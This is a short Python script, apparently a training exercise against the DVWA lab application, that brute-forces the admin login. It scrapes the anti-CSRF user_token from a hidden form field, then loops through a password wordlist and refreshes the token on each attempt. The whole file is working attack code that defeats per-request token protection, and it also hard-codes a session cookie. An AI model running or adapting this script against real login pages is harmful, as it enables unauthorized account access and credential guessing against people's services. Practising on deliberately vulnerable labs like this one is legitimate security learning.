from bs4 import BeautifulSoup
import requests

def get_token(requrl,header):
    response = requests.get(url=requrl,headers=header)
    print(response.status_code,len(response.content))  # response.status_code()，输出状态码  response.content()，获取响应的内容
    soup = BeautifulSoup(response.text,"html.parser")  # 获取被抓取页面的html代码，并使用html.parser来实例化BeautifulSoup，属于固定套路
    input = soup.select("input[type='hidden']")  # 返回的是一个list列表
    user_token = input[0]['value']               #获取用户的token
    return user_token

if __name__ =='__main__':

  requrl = "http://dvwa.bihuo.cn/vulnerabilities/brute/"
  header = {
            "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Language" : "zh-CN,zh;q=0.9,en;q=0.8",
            "Connection" : "keep-alive",
            "Cookie" : "security=high; PHPSESSID=nl4fnihpt4kt4ebv90h5h7fel2",
            "Host" : "dvwa.bihuo.cn",
            "Referer" : "http://dvwa.bihuo.cn/vulnerabilities/brute/",
            "Upgrade-Insecure-Requests" : "1",
            "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0"
            }

  user_token = get_token(requrl,header)
  i = 0
  for line in open("./pass.txt"):
      requrl = "http://dvwa.bihuo.cn/vulnerabilities/brute/?username=admin&password=" + line.strip() + "&Login=Login&user_token=" + user_token
      i = i + 1
      print(i,'admin',line.strip(),end=" ")
      user_token = get_token(requrl,header)
      #if (i == 10):
      #    break
